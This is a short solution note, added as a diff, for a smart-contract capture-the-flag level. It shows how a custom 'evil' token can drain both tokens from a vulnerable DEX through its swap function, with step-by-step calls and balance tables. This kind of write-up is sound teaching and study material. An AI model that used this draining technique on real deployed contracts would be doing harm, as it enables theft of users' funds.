@@ -1,0 +1,43 @@
+Solution:
+-call Hack's mint(player, 400)
+-call Hack's transfer(Level's address, 100)
+-call Hack's approve(Level's address, 300)
+-in console: await contract.swap(evil address, token1 address, 100)
+-in console: await contract.swap(evil address, token2 address, 200)
+
+OTHER NOTES:
+
+Our player starts with 400 because:
+a. 100 goes to DEX's initially for correct getSwapAmount
+b. 100 is swapped to DEX (for correct getSwapAmount) 
+c. 200 is swapped to DEX (for correct getSwapAmount)  
+
+      DEX             |      player  
+token1 - token2 - EVL | token1 - token2 - EVL
+---------------------------------------------
+  100     100     0   |   10      10      400
+
+Send 100 to EVL, again when we swap, EVL with token1,
+we will have a 1 to 1 getSwapAmount ratio. (DEX token 1 to DEX EVL)
+
+      DEX             |      player  
+token1 - token2 - EVL | token1 - token2 - EVL
+---------------------------------------------
+  100     100     100 |   10      10      300
+
+EVL approves DEX to swap 100 and then 200 later on.
+
+Next, as said swap 100 from evil address to get 100 token 1 which results in:
+
+      DEX             |      player  
+token1 - token2 - EVL | token1 - token2 - EVL
+---------------------------------------------
+  0       100     200 |   110     10      200
+
+At this point, token1 is drained.  We still need to drain token2. Next, we swap 200
+in order to meet the current 200 (EVL) to 1 (token2) ratio in the DEX for result:
+
+      DEX             |      player  
+token1 - token2 - EVL | token1 - token2 - EVL
+---------------------------------------------
+  0       0       400 |   110     110     0
